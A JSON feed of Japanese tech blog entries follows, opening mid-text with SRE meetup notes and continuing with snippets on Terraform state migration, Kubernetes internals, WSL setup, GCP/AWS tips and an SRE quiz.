ソフトスキルの担保が大事会社のバリューにあってるかSREワークブックの最後の方求められるスキル書いてあるすべてのインフラコードはIaCに寄せたい、チームにはソフトウェアスキル、インフラスキルそれぞれ持つメンバーがほしい変更時のトラブルシューティングはできるべきコードレビューできるスキルを持っていてほしいコーディングあるていどできる人組織による開発をSREに興味をもってもらうはどうしたらいいのだろうかSLOを決めて共通言語で話す留学すると面白いかもお互いがどういう観点で仕事してるかがわかってよいどこまで開発に移譲するかエラーバジェット、SLO、SLIは必要SREが設定するSLOより開発者が設定するSLOの方がいい開発者にとってうまいところを教えるアプローチ開発者にとってもバグが出ないことによって、気持ちよく開発できるよ!開発者の観点じゃなくてビジネス観点でSLO設定するんじゃないのかなって思う。。。?あと、留学いいなあと思った。開発チームに留学したい。SREチームが存在しない。どんなフェーズになったらSREチームを作ったほうがいいというしきい値あります?開発者が開発以外に手を取られて開発スピードが落ちてるのが目に見えたら兼務の限界値がある。得意なことにバリューを出せるようにしたい開発しながらAWSの新機能をキャッチアップするのはたいへんdevとopsのバランスが崩れているとき SREのプラクティスをいれるといいのかもエラーバジェットが判断軸になるかもどれくらいのチームが困ってるかが判断軸になるToil撲滅の意味で費用対効果高かったLambdaランキング今Lambdaを殆ど使ってないchatbotが出たのでLambdaの役割を終えたEKS上にアプリケーションを作ってしまうことが多い必要悪としてのLambda コードを書くのは最終手段。書いた瞬間に負債になる時刻でEC2終了するLambdaオートスケーリングでいいのでは?terrafromでLambda扱いにくい問題SREとしてセキュリティに対しての役割サービスInspectorECRのイメージスキャンCI/CD成立してからじゃないとイメージスキャンできないGuardDutySSOIAM Userを撲滅できたただ個別要件に対応しにくいSREが見てるケースが多いコーポレートセキュリティは範疇じゃないが、アプリケーションセキュリティは範疇5,6人目にセキュリティが強い人がほしい着想の段階からセキュリティの観点をいれておきたいモニタリングロギングの観点で使用してるAWSのサービスAMPEKS使ってるのでコスパが良かったCloudWatch log通知考えるとLambda使わないとAthenaわずらわしい検索しにくいLokiとかに寄せたいログをどこにおくS3Lokiってこれかな?Grafana Loki | Grafana Labs雑感他の会社のSREの話を今まであまり聞くことがなかったので、気づきを得る部分が多かった。SREのミッション・ビジョン・バリューはちょっと考えてみたいなと思った。オンライン開催の形式はYouTube Liveがいいなあって思った。聞き逃しても巻き戻して聞き返せるのがすごい体験として良い。","isoDate":"2022-02-25T16:26:02.000Z","dateMiliSeconds":1645806362000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/02/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220225","contentSnippet":"普段は#kubenewsの2022年02月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL: 配信中止して記事だけ放流したので配信URLはありません 告知とかニュースっぽいもの NetApp Insight Japan 2022で講演しましたセッション動...","isoDate":"2022-02-25T13:31:31.000Z","dateMiliSeconds":1645795891000,"authorName":"bells17","authorId":"bells17"},{"title":"Future Tech Night #20 Terraform State縛りの勉強会 #future_tech_night","link":"https://blog.masasuzu.net/entry/2022/02/17/210848","contentSnippet":"future.connpass.com久しぶりにちゃんと勉強会の感想ブログ書きます。① State の分割戦略 〜ModulesとWorkspacesを利用して〜StateはTerraform上での管理を分ける意味では非常に重要な要素であり、適切に分けることで不慮の事故や予期せぬ変更からクラウドリソースを守ることができます。このセッションでは演者が実際にTerraformを利用して感じたことを交えながら、適切なStateの分割戦略とは？について話します。Stateの分割についてModuleによるアプローチとWorkspacesによるアプローチ、そしてそのあわせ技についての説明がありました。Workspacesは使ったことないのであまり知見がなかったので、いろいろ参考になる部分がありました。今のterraform運用だと環境ごとにディレクトリを切ってstateを分割してます。で、環境ごとの差異としてパラメータだけでなく、作るリソース作らないリソースが若干まちまちなので、そのままだとWorkspacesは向かないなと感じました。絶対に作るリソース、RDSやVPCなどは分割した上でWorkspacesで管理するのはありなのかなとは思いました。ただ、同じシステムで、環境毎のディレクトリとリソース毎のディレクトリが混在するのはわかりにくくならないかなという懸念はあります。悩ましいですねあと、ブランチ戦略も難しいですね。現状はmasterでprdをapplyするように、stagingでそれ以外の環境をapplyするようになってますが、全部masterでやるようにしても良いのではと思ったりもしてる今日このごろです。② クラウドリソース自体をdestroy/createdせずに、Terraformリソース定義の記述場所を変更する方法クラウドサービス上で稼働するリソースには一切手を付けずに、Terraformの定義記載場所だけを変更する方法を話します。Terraformを利用していると「このディレクトリ配置じゃダメだ。配置変えしたいのだけれど、リソースの再作成はできない。次にインフラ設計するときは、〇〇に注意しよう」という運用ナレッジが貯まると思います。スタート時点で完璧なTerraformディレクトリ設計ができれば御の字ですが、それが不可能なことは、この分野でベストプラクティスが確立されていないことにより証明されています。本パートでは「Terraformのディレクトリ配置には定石がないのだから、運用状況に合わせて柔軟に配置換えすべき」という観点から、「動作中リソースに影響なく、Terraform定義箇所を移植する方法」について話します。20220217_FutureTechNight_#20_TerraformState縛りの勉強会.pptx - Google スライドこんなふうに別のtfstateファイルにリソースをmvすることによって、Stateにリソースを移動できる手法を説明してました。terraform state mv -state-out=${moved_resource.tfstate} ${moved_resource}terraform state pull > ${to.tfstate}terraofm state mv -state=${moved_resource.tfstate} -state-out=${to.tfstate}terraform state push ${to.tfstate}State間でのリソース移動に関しては、terraform state rmとterraform importのあわせ技しか知らなかったので、新しい知見を得ました。まだ試せてないないんですが、State内での移動であれば、moved block使うのもありなのかなと思いました。ちなみリソースが消えた場合にもmove blockって使えるんですかね?なかなか他の会社のterraform運用の話を聞く機会があまりなかったので、楽しかったですね。最近勉強会出てもメモすら残さないことが多くて、せっかく参加したのにあまり有意義に時間を使えていなかったので、薄くてもいいので今後ちゃんと感想、意見を書き残していきたいと思いました。","isoDate":"2022-02-17T12:08:48.000Z","dateMiliSeconds":1645099728000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Kubelet APIをcurlで叩く","link":"https://bells17.medium.com/curl-to-kubelet-api-f73cb17888b7?source=rss-713cf42ce34d------2","isoDate":"2022-02-10T16:10:23.000Z","dateMiliSeconds":1644509423000,"authorName":"bells17","authorId":"bells17"},{"title":"WSL2でDNSは8.8.8.8を見つつX Serverを利用する","link":"https://zenn.dev/tayusa/articles/8a76c02772d0a5","contentSnippet":"概要VPNを利用するのでDNSサーバーを8.8.8.8に固定したいしかし、X Serverを使うので環境変数DISPLAYにWindowsが解決するホスト名を使用しているexport DISPLAY=\\"$(hostname).mshome.net:0.0\\"DISPLAYにホスト名ではなくIPアドレスを設定しDNSサーバーを固定する DNSサーバーを固定 /etc/wsl.confを作成/etc/wsl.conf[network]generateResolvConf = false /etc/resolv.confを削除$ sudo unli...","isoDate":"2021-12-28T00:57:59.000Z","dateMiliSeconds":1640653079000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Accurateの内部実装","link":"https://bells17.medium.com/accurate-internal-70915fe716ca?source=rss-713cf42ce34d------2","isoDate":"2021-12-15T18:56:05.000Z","dateMiliSeconds":1639594565000,"authorName":"bells17","authorId":"bells17"},{"title":"GKE CNI Deep Dive (2021)","link":"https://qiita.com/toVersus/items/4ff2525d562d8de4d530","contentSnippet":"GKE (Google Kubernetes Engine) のネットワーク周りの実装はユーザーの見えないところで変化を続けています。以前は、公式ドキュメントにあるように bridge interface (cbr0) を介してホストマシン (ノード) とコンテナ間でパケッ...","isoDate":"2021-10-23T08:20:56.000Z","dateMiliSeconds":1634977256000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"\uD83D\uDD0D 可観測性に入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/ke-guan-ce-xing-niru-men-siyou","contentSnippet":"社内LTにて、可観測性を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（SREに入門しよう）：\\rhttps://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","isoDate":"2021-10-22T04:00:00.000Z","dateMiliSeconds":1634875200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"WSLでGitHubのPersonal access token認証","link":"https://zenn.dev/tayusa/articles/f81e6551642867","contentSnippet":"参考https://github.com/microsoft/Git-Credential-Manager-Core#windows-subsystem-for-linux-wsl GitCredentialManagerとGitをインストールPowerShellにて> winget install --id Microtsoft.GitCredentialManagerCore> winget install --id Git.Gitwingetがなければ https://github.com/microsoft/winget-cli#installing...","isoDate":"2021-09-30T16:01:55.000Z","dateMiliSeconds":1633017715000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"macOS におけるエンドポイントセキュリティの取り組み","link":"https://speakerdeck.com/kyohmizu/macos-niokeruendopointosekiyuriteifalsequ-rizu-mi","contentSnippet":"Infra Study 2nd #5「低レイヤーの世界への誘い」のLT登壇資料です。\\rhttps://forkwell.connpass.com/event/222932/","isoDate":"2021-09-28T04:00:00.000Z","dateMiliSeconds":1632801600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ストレングスファインダーのコーチングを受けてみた","link":"https://bells17.medium.com/strengthsfinder-2140afddf46f?source=rss-713cf42ce34d------2","isoDate":"2021-08-11T13:27:04.000Z","dateMiliSeconds":1628688424000,"authorName":"bells17","authorId":"bells17"},{"title":"\uD83C\uDFD7️ ドメイン駆動設計と依存性逆転の原則","link":"https://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","contentSnippet":"社内LTにて、ドメイン駆動設計と依存性逆転の原則を布教しましたʕ◔ϖ◔ʔ\\r\\rはてなブックマークのコメントもどうぞ！\\r\\rなお、ドメイン駆動設計を理解するためには、依存についても知る必要があります。\\r\\r是非、依存関係と依存オブジェクト注入もご参照ください\uD83D\uDC4D\uD83C\uDFFB","isoDate":"2021-08-06T04:00:00.000Z","dateMiliSeconds":1628222400000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Kube API Serverの内部実装を解説する技術同人誌を技術書典11で出しました!","link":"https://bells17.medium.com/wrote-the-kube-api-server-book-2155129db374?source=rss-713cf42ce34d------2","isoDate":"2021-07-19T09:16:43.000Z","dateMiliSeconds":1626686203000,"authorName":"bells17","authorId":"bells17"},{"title":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについて","link":"https://zenn.dev/nnaka2992/articles/1fa7fb5d03f958","contentSnippet":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについてTable of ContentsOracleインストール中にでたSysctl系エラーであたったkernel parameterについてMotivationそもそもsysctlとは何なのか？Oracleセットアップ中に遭遇したkernel parameterssemopm変更方法セマフォ(semaphore)とは？SEMSMLSEMMNSSEMOPMSEMMNIfile-max変更方法rem_default/rem_max/...","isoDate":"2021-07-11T08:41:03.000Z","dateMiliSeconds":1625992863000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Isn’t it troublesome to set the log file in python? Use LoggerGenerator","link":"https://daisuke1024akagawa.medium.com/isnt-it-troublesome-to-set-the-log-file-in-python-use-loggergenerator-8e6483843bd3?source=rss-c54ac439ad2b------2","isoDate":"2021-06-30T06:06:24.000Z","dateMiliSeconds":1625033184000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"\uD83E\uDD1D\uD83C\uDFFB 依存関係と依存オブジェクト注入","link":"https://speakerdeck.com/hiroki_hasegawa/yi-cun-guan-xi-toyi-cun-obuziekutozhu-ru","contentSnippet":"社内LTにて、依存関係と依存オブジェクト注入を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（ドメイン駆動設計と依存性逆転の原則）：\\rhttps://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","isoDate":"2021-06-25T04:00:00.000Z","dateMiliSeconds":1624593600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Kustomize でスラッシュを含むパスにパッチを当てる","link":"https://zenn.dev/toshikish/articles/38896bb9ae1913","contentSnippet":"背景Kustomize では JSON Patch を用いて base のマニフェストにパッチを当てることができます。例えば，以下のマニフェストdeployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app.kubernetes.io/name: myapp    app.kubernetes.io/version: v1.0.0    name: myapp    version: v1.0.0...の version の値を v1.0.1 に変えたい場合は，以下の...","isoDate":"2021-05-31T07:34:24.000Z","dateMiliSeconds":1622446464000,"authorName":"toshikish","authorId":"toshikish"},{"title":"\uD83D\uDC2D Goに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/goniru-men-siyou","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-27T04:00:00.000Z","dateMiliSeconds":1622088000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"♾️ SREに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","contentSnippet":"社内LTにて、SRE用語を布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-07T04:00:00.000Z","dateMiliSeconds":1620360000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"\uD83D\uDC2D Lambda関数をGoで実装してみた話","link":"https://speakerdeck.com/hiroki_hasegawa/lambdaguan-shu-wogodeshi-zhuang-sitemitahua","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-03-26T04:00:00.000Z","dateMiliSeconds":1616731200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"VolumePluginの仕組みと実装解説","link":"https://speakerdeck.com/kyohmizu/volumepluginfalseshi-zu-mitoshi-zhuang-jie-shuo","contentSnippet":"勉強会の資料です。\\rhttps://k8sinternal.connpass.com/event/203946/","isoDate":"2021-02-22T05:00:00.000Z","dateMiliSeconds":1613970000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"July Tech Festa 2021 winterで発表&運営スタッフをしました","link":"https://bells17.medium.com/july-tech-festa-2021-winter%E3%81%A7%E7%99%BA%E8%A1%A8-%E9%81%8B%E5%96%B6%E3%82%B9%E3%82%BF%E3%83%83%E3%83%95%E3%82%92%E3%81%97%E3%81%BE%E3%81%97%E3%81%9F-385e7e18aac4?source=rss-713cf42ce34d------2","isoDate":"2021-01-26T04:26:28.000Z","dateMiliSeconds":1611635188000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS ソリューションアーキテクト アソシエート合格までのまとめ","link":"https://qiita.com/dirtymosschan/items/da3eebdf6b7be9c3eb67","contentSnippet":"目次0. はじめに先日、AWS ソリューションアーキテクト アソシエート に合格したので、忘れないうちに色々とアウトプットしておこうと思います。これから受験を考えている方の役にたてればと思います。どんな人間がどのくらいの時間をかけて取得したのかを説明するために、少...","isoDate":"2021-01-19T13:11:47.000Z","dateMiliSeconds":1611061907000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"2020年にKubernetse関連で取り組んだことまとめ","link":"https://bells17.medium.com/2020-kubernetse-4771e660a174?source=rss-713cf42ce34d------2","isoDate":"2020-12-23T16:04:00.000Z","dateMiliSeconds":1608739440000,"authorName":"bells17","authorId":"bells17"},{"title":"GCP の Identity Aware-Proxy を使って SSH した話","link":"https://qiita.com/dirtymosschan/items/fd11001daa68d7c8d943","contentSnippet":"Cloud Identity Aware-Proxy とは？一言で表すと、Google のアカウントを使ってセキュアにリソースに接続できるプロキシサービスです。何ができる？GCP 上の VM に対して、アクセス制御を行うことができるGoogle アカウントの ...","isoDate":"2020-12-22T11:20:18.000Z","dateMiliSeconds":1608636018000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"gRPC-WebとGoとVue.jsで簡素なチャット","link":"https://qiita.com/atsuya0/items/f994ca9d820d307daffd","contentSnippet":"はじめに何だか良くわからないけどよく聞くgRPC-Webなるものを触りだけでも理解すべく辛うじてチャット呼べそうなものを作ってみました。概要gRPCとはhttps://grpc.io/Protocol BuffersやHTTP2などを利用した環境に依存せず...","isoDate":"2020-12-17T17:06:43.000Z","dateMiliSeconds":1608224803000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"VolumePlugin がボリュームを作成・マウントするしくみ","link":"https://qiita.com/kyohmizu/items/40bee7037e1ce7949772","contentSnippet":"はじめにPod の作成時、pod.spec.volumes に記述したボリュームがコンテナにマウントされます。マウントされる Node 側のボリュームを、VolumePlugin がどのように作成・マウントしているのか調べました。機能VolumePlugin は...","isoDate":"2020-12-17T10:54:47.000Z","dateMiliSeconds":1608202487000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Sidekiqのジョブをパフォーマンスを考えて削除する","link":"https://qiita.com/atsuya0/items/30d6259766a9a0d5103d","contentSnippet":"はじめにRailsで処理を何らかの理由で遅延させた場合や非同期に処理を行いたいときに多くの人がActive Jobを使用していると思います。とても便利で良いやつなのですがキューに積んだジョブを削除しようとするとたちまち暗雲が立ち込めます。前提アダプタは記事のタイ...","isoDate":"2020-12-12T17:37:05.000Z","dateMiliSeconds":1607794625000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"任意のファイルをPNGファイルで隠してみる","link":"https://qiita.com/atsuya0/items/a8ccbc9637c37cdf967e","contentSnippet":"はじめにある日、私はファイルを連結したらどうなるんだろうという好奇心に逆らえず、おもむろに連結して確かめてみることにしました。結果、その連結したファイルは普通にファイルとして使えることがわかりました。ファイルを読み込むシステムによるとは思いますが、後ろのファイルはた...","isoDate":"2020-12-12T14:56:30.000Z","dateMiliSeconds":1607784990000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Kubernetes Internal #1を開催しました","link":"https://bells17.medium.com/kubernetes-internal-1-ea0f1adcfe33?source=rss-713cf42ce34d------2","isoDate":"2020-10-19T10:29:31.000Z","dateMiliSeconds":1603103371000,"authorName":"bells17","authorId":"bells17"},{"title":"Istio の timeout, retry, circuit breaking, etc","link":"https://medium.com/@yteraoka/istio-%E3%81%AE-timeout-retry-circuit-breaking-etc-c170285447e8?source=rss-8b55af126a13------2","isoDate":"2020-10-17T14:52:08.000Z","dateMiliSeconds":1602946328000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS CDK on Scala ~ Scalaでインフラ管理してみたはなし / Manage infrastructure with AWS CDK on Scala","link":"https://speakerdeck.com/nomadblacky/manage-infrastructure-with-aws-cdk-on-scala","contentSnippet":"https://scala-tokyo.connpass.com/event/187140/","isoDate":"2020-09-25T04:00:00.000Z","dateMiliSeconds":1601006400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"kubeadmの共通処理の実装","link":"https://bells17.medium.com/kubeadm-common-implementation-a5e5b3890dde?source=rss-713cf42ce34d------2","isoDate":"2020-09-12T19:22:01.000Z","dateMiliSeconds":1599938521000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes (k8s) 管理者用GUI Lens","link":"https://qiita.com/tozastation/items/804949c69df5d53643c6","contentSnippet":"Lensとはlensapp/lensk8sで動作する全てのリソースをモニタリングしてくれるGUIアプリLinux/Mac/Windowsで動作するこんな感じ（kindで作ったクラスタ見てます）助かりポイントリソース（Pod/Namespace/C...","isoDate":"2020-09-07T12:53:18.000Z","dateMiliSeconds":1599483198000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Slinky で Scala.js 製 React Webアプリケーションを つくったはなし / How to build a Scala.js React web application in Slinky","link":"https://speakerdeck.com/nomadblacky/how-to-build-a-scala-dot-js-react-web-application-in-slinky","contentSnippet":"Scala.js 向けの React フレームワークである Slinky でWebアプリケーションを作成したはなし","isoDate":"2020-08-30T04:00:00.000Z","dateMiliSeconds":1598760000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Cloud SQLへのprivate ip 接続でハマった話","link":"https://qiita.com/SatohJohn/items/e79f363798a6233f9ad2","contentSnippet":"概要Cloud SQL(MySQL)に対してprivate ipを使ってアクセスしたときに、何をチェックしたかをメモするハマったからにはきちんとログを残す現象GCE から Cloud SQLに対してprivate ipでアクセスができない$ mysql -u ...","isoDate":"2020-08-07T16:53:50.000Z","dateMiliSeconds":1596819230000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"情報処理安全確保支援士の関連資料","link":"https://kyohmizu.hatenablog.com/entry/2020/08/05/115459","contentSnippet":"情報処理安全確保支援士の業務を行う上で、参照すべき資料一覧です。サイバーセキュリティ基本法（平成二十六年法律第百四号）情報処理の促進に関する法律（昭和四十五年法律第九十号）情報処理学会倫理綱領RFC:1087 倫理とインターネット(Ethics and the Internet)セキュリティ対応組織 (SOC,CSIRT)強化に向けたサイバーセキュリティ情報共有の「5W1H」 v2.0 (2019年4月)JPCERT インシデントハンドリングマニュアルIPA 脆弱性対策の効果的な進め方（ツール活用編）情報セキュリティ早期警戒パートナーシップガイドラインIPA 重要なセキュリティ情報一覧IPA 共通脆弱性評価システムCVSS v3概説JVN (Japan Vulnerability Notes)JVN 脆弱性レポートの読み方JVN iPediaFIRST Common Vulnerability Scoring System SIGCWE (Common Weakness Enumeration)IPA 脆弱性体験学習ツール AppGoatMyJVNIPA 組織における内部不正防止ガイドライン地方公共団体における情報セキュリティポリシーに関するガイドライン(平成30年9月版)IPA 委託関係における情報セキュリティ対策ガイドラインIPA 中小企業の情報セキュリティ対策ガイドラインIPA 情報漏えい対策のしおりNISC スマートフォン等の業務利用における情報セキュリティ対策の実施手順作成手引書個人情報の保護に関する法律についてのガイドラインIPA 企業(組織)における最低限の情報セキュリティ対策のしおりスマートフォンのセキュリティ＜危険回避＞対策のしおりJPCERT/CC 技術メモ - 安全な Web ブラウザの使い方IPA ウェブブラウザのプロテクションプロファイル","isoDate":"2020-08-05T02:54:59.000Z","dateMiliSeconds":1596596099000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"AWS CodeBuild において オンプレのJenkins では成功していたファイル権限系のテストをするとうまくいかない","link":"https://qiita.com/tayakun/items/6b721985bc098dda9846","contentSnippet":"この記事を書くに至った経緯私が開発しているチームでは、Jenkinsでビルド・テストを行っていました。色々と環境をAWSに載せ替えていく中で、AWS CodeBuildを使用することになりました。ところが、ReadOnlyに設定したファイルにWriteできないことを...","isoDate":"2020-06-22T15:15:05.000Z","dateMiliSeconds":1592838905000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Mac VScode Maven でJunit 使ってみた","link":"https://qiita.com/tayakun/items/16201aa0371fa874ec78","contentSnippet":"はじめにとりあえずVSCodeでJUnit使ってユニットテスト体験してみたい人が対象です。まだJavaすらMacに入れてないんだ！って人はこちらを参考にしてみてください。動作環境macOS : Catalina 10.15.5VSCode : 1.46.1...","isoDate":"2020-06-19T18:23:53.000Z","dateMiliSeconds":1592591033000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Handy Admission Webhook Library","link":"https://qiita.com/toVersus/items/5316e94490d60c220af7","contentSnippet":"Kubernetes の Admission Webhook を開発する際に、kubernetes/api をラップした軽量なライブラリやフレームワークを使うことがあると思います。kubernetes-sigs/controller-runtimeslok/kubew...","isoDate":"2020-06-14T05:05:07.000Z","dateMiliSeconds":1592111107000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Mac VSCode JavaでHelloWorldした","link":"https://qiita.com/tayakun/items/a38386288c50233c6a90","contentSnippet":"はじめにタイトル通り、ただHelloWorldするだけです。よくある標準出力するだけの課題とかをささっとすますにはいいかもしれません。今からこの環境でWebアプリとか作っちゃうんだ！って人にはお勧めしません。他にIntelliJ IDEA, Eclipse + P...","isoDate":"2020-06-10T14:57:49.000Z","dateMiliSeconds":1591801069000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Chaos Mesh によるカオスエンジニアリング","link":"https://medium.com/@yteraoka/chaos-mesh-%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%82%AA%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0-46fa2897c742?source=rss-8b55af126a13------2","isoDate":"2020-06-02T03:16:16.000Z","dateMiliSeconds":1591067776000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub ActionsからGAEにdeployする際のsecretの扱い","link":"https://qiita.com/SatohJohn/items/2341168ccb93c5e144ab","contentSnippet":"概要この記事の内容としては以下の通りGAEのapp.yamlが環境変数を読み取らないので、値をなんとか渡す方法。GitHubActionsで認証ファイルを扱う方法。ユースケースとして、GAEにGitHub Actionsを使ってdeployしたいGAEのアプ...","isoDate":"2020-05-13T08:20:51.000Z","dateMiliSeconds":1589358051000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"3月末日で退職してました","link":"https://blog.masasuzu.net/entry/2020/04/12/134300","contentSnippet":"株式会社モバイルファクトリーを3/31で退職してました。2010年6月入社なので9年10ヶ月になりますね。今は新しい会社のSREチームで働いています。前半数年間はケータイ向けのサイト(いわゆる着メロサイト)やソーシャルアプリの開発運用をしていました。後半数年間は社内全体の開発基盤・運用基盤の整備をしていました。いわゆるインフラよりのお仕事ですね。入社当時Webアプリケーション開発をまったく分かってなかったところからなんとか人並みに運用開発できる力をこの会社で身につけることが出来たと思います。今なんとかwebエンジニアをやれてるのはこの会社のおかげと言っても過言では無いと思っています。入社当時SQLをまともに書けなかったくらいのレベルだったのでよく採用されたなと。。。お仕事的には回りのレベルも高いし、自身の仕事のやり方も裁量を与えられていたし、社内環境も、待遇も悪くなかった。むしろ良かったくらいでした。ただ、長年勤めていく内に悪い意味での慣れが出てきて、自分自身停滞感を感じることが出てきました。ここ数年が特に感じることが多く、停滞感から来る焦りを日々感じていました。どうにか停滞感を解消するために副業として他社のお仕事を請け負ったりしていましたが、どうにも解消ができずにいました。そんな折に現職のSREチームの話をいただきました。実際に面談、面接を受けて、課題や環境の話を聞くにつれて、ここでなら一歩進めるのではないかという感触を得ました。もちろん焦燥感、停滞感はあれど、居心地が良いと感じてた今までの環境を変えることにはかなりの葛藤がありました。いろんな決め手はあったのですが、新しい場所の方が一番の下手*1でいれそう、なにより事業的にも業務的にも仲間的にもワクワクできそうというあたりが決定打になりました。入社して2週間しかも、初日以外ずっと在宅勤務なのでまだ様子が摑めてないですが、早くキャッチアップしてバリバリ成果を出していきたい所存です。これからもよろしくお願いします。例のもの置いておきます。気が向いたらでよいです。https://www.amazon.jp/hz/wishlist/ls/3S4C1LCDWKCTM?ref_=wl_share*1:情熱プログラマ参照","isoDate":"2020-04-12T04:43:00.000Z","dateMiliSeconds":1586666580000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"IAPに対応しているGAEにアクセスする","link":"https://qiita.com/SatohJohn/items/d21d8487f55ed911e687","contentSnippet":"概要GCPにあるGAEに対してアクセスする場合、認証のためにIAPをつけることが多いハズその際にrequest clientに対して認証情報を付ける方法についてまとめるサービスアカウントを作るサービスアカウントは以下の通りに作成できるhttps://cloud...","isoDate":"2020-03-29T12:12:15.000Z","dateMiliSeconds":1585483935000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Vuetify.jsのリンクの違いについて","link":"https://qiita.com/SatohJohn/items/881d9a6fceceda1c1ce7","contentSnippet":"概要vuetifyのbuttonやlist-itemなどに対してnuxt linkをつける際にリンクの付け方は2つあるhreftoどう使い分けるかというと、 https://qiita.com/white0221/items/ad4136cf2b80eda25...","isoDate":"2020-03-22T11:06:18.000Z","dateMiliSeconds":1584875178000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"圏論とコンピュータサイエンス / Category Theory and Theoretical Computer Science","link":"https://speakerdeck.com/yunosukey/category-theory-and-theoretical-computer-science","contentSnippet":"","isoDate":"2020-03-09T04:00:00.000Z","dateMiliSeconds":1583726400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Merpay SRE Quiz @SRE Next 2020 解答・解説","link":"https://toshikish.hateblo.jp/entry/2020/02/11/024400","contentSnippet":"これは何？2020年1月25日に行われた SRE NEXT 2020 で，メルペイさんがブースで出していた SRE に関するクイズです。正答数で景品がもらえたようです。3問以上：メルペイキーキャップ4問以上：メルペイキーキャップ＋メルペイ SRE が推薦する本今日は SRE NEXT に来ています！ブース出してます！メルペイSREが考えたクイズに挑戦してみてください！#srenext pic.twitter.com/sQmndWucrP— Mercari_Dev (@mercaridevjp) January 25, 2020 メルペイ SRE が推薦する本って？ツイートのスレッドをたどっていくと，ラインナップは以下のようでした。『入門 監視』『詳解 シェルスクリプト』『Kubernetes 完全ガイド』『Programming Kubernetes』『パケットキャプチャの教科書』『プロダクションレディ マイクロサービス』『Linux カーネル Hacks』『エンジニアリング組織論への招待』『エンジニアのためのマネジメントキャリアパス』名著ばかりですね。第1問 SLO とはなんの略でしょうか？選択肢Service Level Observability (サービスレベル可観測性)Service Level Objective (サービスレベル目標)System Level Observability (システムレベル可観測性)System Level Objective (システムレベル目標)正解Service Level Objective (サービスレベル目標)解説SRE 本の Chapter 4 - Service Level Objectives に書かれている定義は以下のとおりです。An SLO is a service level objective: a target value or range of values for a service level that is measured by an SLI.SLI（サービスレベル指標）の目標値または値の範囲を SLO（サービスレベル目標）といいます。第2問 ユーザーが所属しているユーザーグループを知るためのコマンドはどれか？選択肢idwhoamiwholsgroup正解id解説明示されていないですが，UNIX 系 OS のコマンドを前提としていますね。id：ユーザー情報を表示するコマンドで，ユーザー情報（ID，名前）とグループ情報（ID，名前）が表示されます。実行例：foobar@darkstar:~$ iduid=1016(foobar) gid=100(users) groups=100(users)whoami：実行ユーザーの ID を表示するコマンドです。id -un 